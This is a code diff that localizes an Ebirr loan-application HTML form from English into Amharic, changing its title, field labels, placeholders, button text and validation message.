@@ -1,10 +1,10 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="am">
 
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Ebirr - Loan Application</title>
+    <title>ኢብር - የብድር ማመልከቻ</title>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
         * {
@@ -213,45 +213,45 @@
 <body>
     <header>
         <button class="back-btn" onclick="history.back()">←</button>
-        <div class="logo"><span class="logo-eco">Ebirr</span><span class="logo-cash">Loan</span></div>
+        <div class="logo"><span class="logo-eco">ኢብር</span><span class="logo-cash">ብድር</span></div>
         <div></div>
     </header>
 
     <main class="card">
-        <h1 class="form-title">Loan Application</h1>
+        <h1 class="form-title">የብድር ማመልከቻ</h1>
         <div class="progress-bar">
             <div class="progress-fill"></div>
         </div>
-        <div class="step-text">Step 2 of 3</div>
+        <div class="step-text">ደረጃ 2 ከ 3</div>
 
         <div class="name-group">
             <div>
-                <label class="form-label">First Name</label>
-                <input type="text" class="form-input" id="firstName" placeholder="John">
+                <label class="form-label">ስም</label>
+                <input type="text" class="form-input" id="firstName" placeholder="ጆን">
             </div>
             <div>
-                <label class="form-label">Last Name</label>
-                <input type="text" class="form-input" id="lastName" placeholder="Doe">
+                <label class="form-label">የአባት ስም</label>
+                <input type="text" class="form-input" id="lastName" placeholder="ዶይ">
             </div>
         </div>
 
-        <label class="form-label">Email Address</label>
+        <label class="form-label">የኢሜይል አድራሻ</label>
         <input type="email" class="form-input" id="email" placeholder="john.doe@example.com" style="margin-bottom:24px;">
 
-        <label class="form-label">Phone Number</label>
+        <label class="form-label">የስልክ ቁጥር</label>
         <div class="phone-group" id="phoneGroup">
             <span class="phone-prefix">+251</span>
             <input type="tel" class="phone-input" id="phone" placeholder="991234567">
         </div>
-        <small style="color:#999; display:block; margin-bottom:30px;">Enter 9 digits (e.g. 771234567)</small>
+        <small style="color:#999; display:block; margin-bottom:30px;">9 አሃዞችን ያስገቡ (ለምሳሌ 771234567)</small>
 
         <div class="btn-group">
-            <button class="prev-btn" onclick="history.back()">PREVIOUS</button>
-            <button class="next-btn" id="nextBtn">NEXT STEP</button>
+            <button class="prev-btn" onclick="history.back()">ወደ ኋላ</button>
+            <button class="next-btn" id="nextBtn">ቀጣይ ደረጃ</button>
         </div>
     </main>
 
-    <footer>© 2025 Ebirr</footer>
+    <footer>© 2025 ኢብር</footer>
 
     <script>
         // Pre-fill if user goes back
@@ -289,7 +289,7 @@
             }
 
             if (!valid) {
-                alert('Please complete all fields correctly.\n• Email must be valid\n• Phone must be exactly 9 digits');
+                alert('እባክዎ ሁሉንም መስኮች በትክክል ይሙሉ።\n• ኢሜይል ትክክለኛ መሆን አለበት\n• የስልክ ቁጥር በትክክል 9 አሃዞች መሆን አለበት');
                 return;
             }
 
